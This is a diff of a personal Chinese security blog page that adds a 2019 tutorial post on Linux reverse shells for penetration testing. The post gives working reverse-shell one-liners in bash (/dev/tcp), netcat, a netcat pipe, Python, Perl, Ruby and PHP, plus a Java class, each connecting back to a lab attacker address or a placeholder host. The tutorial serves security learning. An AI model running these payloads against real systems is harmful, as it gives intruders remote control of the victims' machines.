@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT">
+  <meta name="keywords" content="linux,">
 
 
 
@@ -81,16 +81,26 @@
 
 
 
-<meta name="description" content="一只大一单身狗">
-<meta property="og:type" content="website">
-<meta property="og:title" content="晨曦远的博客">
-<meta property="og:url" content="http://chenxiyuan.vip/categories/随笔/index.html">
+<meta name="description" content="之前也看过大牛们做题时利用反弹shell,一直没有仔细研究.今天又看了几位师傅的博客,自己总结一下. 为什么要反弹shell在渗透测试中,当我们可以得到一个可以执行远程命令的漏洞时,我们通常会去获取一个shell,但是通常服务器防火墙亦或者云上都会对端口等进行严格控制.导致不能通过监听端口进行shell连接,这种情况下该怎么获取shell呢?而通常情况下,不论是防火墙还是云盾等防护措施,不会对服务">
+<meta name="keywords" content="linux">
+<meta property="og:type" content="article">
+<meta property="og:title" content="linux反弹shell">
+<meta property="og:url" content="http://chenxiyuan.vip/2019/07/29/linux反弹shell/index.html">
 <meta property="og:site_name" content="晨曦远的博客">
-<meta property="og:description" content="一只大一单身狗">
+<meta property="og:description" content="之前也看过大牛们做题时利用反弹shell,一直没有仔细研究.今天又看了几位师傅的博客,自己总结一下. 为什么要反弹shell在渗透测试中,当我们可以得到一个可以执行远程命令的漏洞时,我们通常会去获取一个shell,但是通常服务器防火墙亦或者云上都会对端口等进行严格控制.导致不能通过监听端口进行shell连接,这种情况下该怎么获取shell呢?而通常情况下,不论是防火墙还是云盾等防护措施,不会对服务">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://i1.fuimg.com/665720/9c1035410241c310.png">
+<meta property="og:image" content="http://i1.fuimg.com/665720/b6d1dfb2285884ed.png">
+<meta property="og:image" content="http://i1.fuimg.com/665720/ad21ca669d2ac1fd.png">
+<meta property="og:image" content="http://i1.fuimg.com/665720/9dd9c50921f9b1df.png">
+<meta property="og:image" content="http://i1.fuimg.com/665720/823a2db1273bc45f.png">
+<meta property="og:image" content="http://i2.tiimg.com/665720/2871aebae95374bb.png">
+<meta property="og:image" content="http://i2.tiimg.com/665720/c8a3c96c94c30eff.png">
+<meta property="og:updated_time" content="2019-07-29T16:03:55.924Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="晨曦远的博客">
-<meta name="twitter:description" content="一只大一单身狗">
+<meta name="twitter:title" content="linux反弹shell">
+<meta name="twitter:description" content="之前也看过大牛们做题时利用反弹shell,一直没有仔细研究.今天又看了几位师傅的博客,自己总结一下. 为什么要反弹shell在渗透测试中,当我们可以得到一个可以执行远程命令的漏洞时,我们通常会去获取一个shell,但是通常服务器防火墙亦或者云上都会对端口等进行严格控制.导致不能通过监听端口进行shell连接,这种情况下该怎么获取shell呢?而通常情况下,不论是防火墙还是云盾等防护措施,不会对服务">
+<meta name="twitter:image" content="http://i1.fuimg.com/665720/9c1035410241c310.png">
 
 
 
@@ -120,13 +130,13 @@
 
 
 
-  <link rel="canonical" href="http://chenxiyuan.vip/categories/随笔/">
+  <link rel="canonical" href="http://chenxiyuan.vip/2019/07/29/linux反弹shell/">
 
 
 
 
 
-  <title>分类: 随笔 | 晨曦远的博客</title>
+  <title>linux反弹shell | 晨曦远的博客</title>
   
 
 
@@ -145,7 +155,7 @@
     
   
 
-  <div class="container sidebar-position-left ">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -281,105 +291,284 @@
           <div id="content" class="content">
             
 
+  <div id="posts" class="posts-expand">
+    
+
+  
+
   
   
   
-  <div class="post-block category">
-
-    <div id="posts" class="posts-collapse">
-      <div class="collection-title">
-        <h2>随笔<small>分类</small>
-        </h2>
-      </div>
-
-      
-        
 
   <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://chenxiyuan.vip/2019/07/29/linux反弹shell/">
 
-      <h3 class="post-title">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="晨曦远">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="http://i2.bvimg.com/665720/a3df83bbe2d864de.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="晨曦远的博客">
+    </span>
+
+    
+      <header class="post-header">
+
         
-            <a class="post-title-link" href="/2019/05/21/诗/" itemprop="url">
-              
-                <span itemprop="name">诗</span>
-              
-            </a>
         
-      </h3>
+          <h2 class="post-title" itemprop="name headline">linux反弹shell</h2>
+        
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-05-21T15:52:53+08:00" content="2019-05-21">
-          05-21
-        </time>
-      </div>
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-29T21:52:53+08:00">
+                2019-07-29
+              </time>
+            
 
-    </header>
-  </article>
+            
+              <span class="post-meta-divider">|</span>
+            
 
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2019-07-30T00:03:55+08:00">
+                2019-07-30
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/杂项/" itemprop="url" rel="index">
+                    <span itemprop="name">杂项</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2019/07/29/linux反弹shell/" class="leancloud_visitors" data-flag-title="linux反弹shell">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+	<span class="post-meta-divider">|</span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  855 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  3 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h3 class="post-title">
-        
-            <a class="post-title-link" href="/2018/11/15/11-15/" itemprop="url">
-              
-                <span itemprop="name">11.15</span>
-              
-            </a>
-        
-      </h3>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2018-11-15T17:33:15+08:00" content="2018-11-15">
-          11-15
-        </time>
-      </div>
-
-    </header>
-  </article>
-
+      
 
       
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h3 class="post-title">
-        
-            <a class="post-title-link" href="/2018/10/18/My first blog/" itemprop="url">
-              
-                <span itemprop="name">Welcome to my blog.</span>
-              
-            </a>
-        
-      </h3>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2018-10-18T23:44:28+08:00" content="2018-10-18">
-          10-18
-        </time>
-      </div>
-
-    </header>
-  </article>
-
+        <p>之前也看过大牛们做题时利用反弹shell,一直没有仔细研究.今天又看了几位师傅的博客,自己总结一下.</p>
+<h2 id="为什么要反弹shell"><a href="#为什么要反弹shell" class="headerlink" title="为什么要反弹shell"></a>为什么要反弹shell</h2><p>在渗透测试中,当我们可以得到一个可以执行远程命令的漏洞时,我们通常会去获取一个shell,但是通常服务器防火墙亦或者云上都会对端口等进行严格控制.导致不能通过监听端口进行shell连接,这种情况下该怎么获取shell呢?<br>而通常情况下,不论是防火墙还是云盾等防护措施,不会对服务器对外连接进行限制(特殊情况除外),这时候就可以通过反弹shell来获取连接,即通过服务器反向连接一个外部机器来获取一个shell.<br><a id="more"></a></p>
+<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>在理解反弹shell的操作命令前,可以先看一看前辈写的<a href="https://www.cnblogs.com/chengmo/archive/2010/10/20/1855805.html" target="_blank" rel="noopener">linux文件描述符</a>.<br>攻击机kali:192.168.91.133<br>靶机ubuntu:192.168.91.134</p>
+<h3 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h3><p>bash反弹shell应该是最常见的操作.<br>攻击机kali监听2333端口:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 2333</span><br></pre></td></tr></table></figure></p>
+<p>靶机:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.91.133/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure></p>
+<p>然后kali上就出现了ubuntu的shell.<br><img src="http://i1.fuimg.com/665720/9c1035410241c310.png" alt="Markdown"></p>
+<ul>
+<li><code>bash -i</code> 表示产生一个交互式的shell</li>
+<li><code>dev/tcp/host/port</code> 这个文件非常特殊,可以理解为一个设备.如果host 是一个合法的主机名或internet地址,并且port是一个整数端口号或服务名,bash试图建立与相应的socket(套接字)的TCP连接.</li>
+</ul>
+<h3 id="netcat反弹shell"><a href="#netcat反弹shell" class="headerlink" title="netcat反弹shell"></a>netcat反弹shell</h3><p>netcat的-e参数后面跟一个可执行程序的名称,因为我的ubuntu的netcat是不带这个参数e的,所以这里我用kali作为靶机,ubuntu攻击机.<br>ubuntu监听2333端口:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 2333</span><br></pre></td></tr></table></figure></p>
+<p>kali弹shell给ubuntu:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.91.134 2333</span><br></pre></td></tr></table></figure></p>
+<p>成功弹shell.<br><img src="http://i1.fuimg.com/665720/b6d1dfb2285884ed.png" alt="Markdown"></p>
+<h3 id="利用管道反弹shell"><a href="#利用管道反弹shell" class="headerlink" title="利用管道反弹shell"></a>利用管道反弹shell</h3><p>因为有的发行版linux中netcat是不带这个参数的,这时候可以利用管道进行反弹shell.<br>首先攻击机kali监听两个端口2333,7777:<br><img src="http://i1.fuimg.com/665720/ad21ca669d2ac1fd.png" alt="Markdown"><br>然后ubuntu连接攻击机2333端口,将传递过来的命令交给/bin/bash执行然后将结果返回到7777端口:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.91.133 2333 | /bin/bash | nc 192.168.91.133 7777</span><br></pre></td></tr></table></figure></p>
+<p>监听2333端口的会话成功得到shell,然后执行命令,结果返回在7777端口的会话.<br><img src="http://i1.fuimg.com/665720/9dd9c50921f9b1df.png" alt="Markdown"></p>
+<h3 id="常见脚本反弹"><a href="#常见脚本反弹" class="headerlink" title="常见脚本反弹"></a>常见脚本反弹</h3><h4 id="python"><a href="#python" class="headerlink" title="python"></a>python</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("x.x.x.x",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'</span></span><br></pre></td></tr></table></figure>
+<p><img src="http://i1.fuimg.com/665720/823a2db1273bc45f.png" alt="Markdown"></p>
+<h4 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h4><p>方法1:<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">'use Socket;$i="x.x.x.x";$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="http://i2.tiimg.com/665720/2871aebae95374bb.png" alt="Markdown"><br>方法2:<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -MIO -e <span class="string">'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"x.x.x.x:port");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="http://i2.tiimg.com/665720/c8a3c96c94c30eff.png" alt="Markdown"></p>
+<h4 id="ruby"><a href="#ruby" class="headerlink" title="ruby"></a>ruby</h4><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e <span class="string">'exit if fork;c=TCPSocket.new("x.x.x.x","port");while(cmd=c.gets);IO.popen(cmd,"r")&#123;|io|c.print io.read&#125;end'</span></span><br></pre></td></tr></table></figure>
+<h4 id="php"><a href="#php" class="headerlink" title="php"></a>php</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">'$sock=fsockopen("x.x.x.x",port);exec("/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure>
+<h4 id="java"><a href="#java" class="headerlink" title="java"></a>java</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">   public class Revs &#123;</span><br><span class="line">    /**</span><br><span class="line">    * @param args</span><br><span class="line">    * @throws Exception </span><br><span class="line">    */</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        // TODO Auto-generated method stub</span><br><span class="line">        Runtime r = Runtime.getRuntime();</span><br><span class="line">        String cmd[]= &#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/x.x.x.x/port;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;&#125;;</span><br><span class="line">        Process p = r.exec(cmd);</span><br><span class="line">        p.waitFor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
       
     </div>
+    
+    
+    
+	
+  
+	
+    
 
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div></div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="http://i2.bvimg.com/665720/9bf350c66f7a91e7.png" alt="晨曦远 微信支付">
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="http://i2.bvimg.com/665720/1f7009583c490cc2.jpg" alt="晨曦远 支付宝">
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+      <div>
+         <ul class="post-copyright"> <li class="post-copyright-author"> <strong>本文标题:</strong> <a href="/2019/07/29/linux反弹shell/">linux反弹shell</a> </li> <li class="post-copyright-author"> <strong>本文作者：</strong>晨曦远 </li> <li class="post-copyright-author"> <strong>发布时间:</strong>2019年07月29日 - 21:07 </li> <li class="post-copyright-author"> <strong>最后更新:</strong>2019年07月30日 - 00:07 </li> <li class="post-copyright-link"> <strong>本文链接：</strong> <a href="http://chenxiyuan.vip/2019/07/29/linux反弹shell/" title="linux反弹shell">http://chenxiyuan.vip/2019/07/29/linux反弹shell/</a> </li> <li class="post-copyright-license"> <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！ </li> </ul> 
+
+
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/linux/" rel="tag"><i class="fa fa-tag"></i> linux</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/07/29/bugku逆向/" rel="next" title="bugku逆向">
+                <i class="fa fa-chevron-left"></i> bugku逆向
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
+  </article>
 
-  
 
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -387,6 +576,15 @@
 
 
           
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC80MDQxNy8xNjk0NA=="></div>
+    </div>
+
+  
+
+
 
         </div>
         
@@ -407,8 +605,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -534,6 +741,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#为什么要反弹shell"><span class="nav-number">1.</span> <span class="nav-text">为什么要反弹shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#反弹shell"><span class="nav-number">2.</span> <span class="nav-text">反弹shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#bash"><span class="nav-number">2.1.</span> <span class="nav-text">bash</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#netcat反弹shell"><span class="nav-number">2.2.</span> <span class="nav-text">netcat反弹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用管道反弹shell"><span class="nav-number">2.3.</span> <span class="nav-text">利用管道反弹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#常见脚本反弹"><span class="nav-number">2.4.</span> <span class="nav-text">常见脚本反弹</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#python"><span class="nav-number">2.4.1.</span> <span class="nav-text">python</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#perl"><span class="nav-number">2.4.2.</span> <span class="nav-text">perl</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ruby"><span class="nav-number">2.4.3.</span> <span class="nav-text">ruby</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#php"><span class="nav-number">2.4.4.</span> <span class="nav-text">php</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#java"><span class="nav-number">2.4.5.</span> <span class="nav-text">java</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -691,6 +914,10 @@
 
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
@@ -719,6 +946,17 @@
 
 
 
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
   
 
 
